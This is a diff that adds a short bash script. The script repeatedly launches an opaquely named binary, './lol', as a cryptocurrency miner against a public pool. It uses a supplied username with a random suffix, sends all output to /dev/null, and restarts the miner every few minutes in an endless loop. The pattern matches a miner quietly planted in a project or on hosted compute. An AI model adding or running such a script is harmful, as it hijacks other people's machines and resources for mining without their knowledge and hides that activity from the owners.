@@ -1,0 +1,8 @@
+#!/bin/bash
+user="$1"
+top="$(shuf -n 1 -i 1-999999)"
+while :
+do
+  timeout 3m ./lol --pool xmr.f2pool.com:13531 --username $user.$top --password x --algorithm wrkzcoin >/dev/null
+  sleep 20s
+done
